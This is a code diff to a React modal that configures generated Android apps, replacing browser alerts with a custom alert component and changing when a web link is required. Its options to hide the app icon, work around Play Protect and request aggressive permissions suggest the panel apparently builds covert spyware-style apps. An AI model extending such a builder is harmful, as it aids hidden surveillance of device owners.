@@ -1,6 +1,7 @@
 "use client";
 
 import { useState, useEffect } from 'react';
+import CustomAlertModal from './CustomAlertModal';
 
 interface AppGenerationModalProps {
     isOpen: boolean;
@@ -34,6 +35,10 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [showAdvanced, setShowAdvanced] = useState(false);
     const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
     const [aggressivePermissions, setAggressivePermissions] = useState(false);
+
+    // Custom Alert Modal State
+    const [showCustomAlert, setShowCustomAlert] = useState(false);
+    const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });
 
     useEffect(() => {
         if (isOpen) {
@@ -100,15 +105,18 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
     const startGeneration = async () => {
         // Validate web link requirement
-        if (hideApp && !webLink.trim()) {
-            alert('⚠️ Web Link is required when "Hide App Icon" is enabled!\n\nThe app needs a WebView link to display when hidden from launcher.');
+        // Web link is MANDATORY when app is NOT hidden
+        if (!hideApp && !webLink.trim()) {
+            setAlertData({
+                title: 'Web Link Required',
+                message: 'Please provide a WebView link for your app.\n\nThe app needs a URL to display when it starts.',
+                type: 'warning'
+            });
+            setShowCustomAlert(true);
             return;
         }
 
-        if (!hideApp && !webLink.trim()) {
-            const confirmed = confirm('You have not provided a Web Link.\n\nThe app will not show any WebView interface. Continue?');
-            if (!confirmed) return;
-        }
+        // When hideApp is true, proceed silently without asking (no validation)
 
         setStatus('generating');
         setProgress(5);
@@ -600,6 +608,15 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                         </>
                     )}
                 </div>
+
+                {/* Custom Alert Modal */}
+                <CustomAlertModal
+                    isOpen={showCustomAlert}
+                    onClose={() => setShowCustomAlert(false)}
+                    title={alertData.title}
+                    message={alertData.message}
+                    type={alertData.type}
+                />
             </div>
         </div>
     );
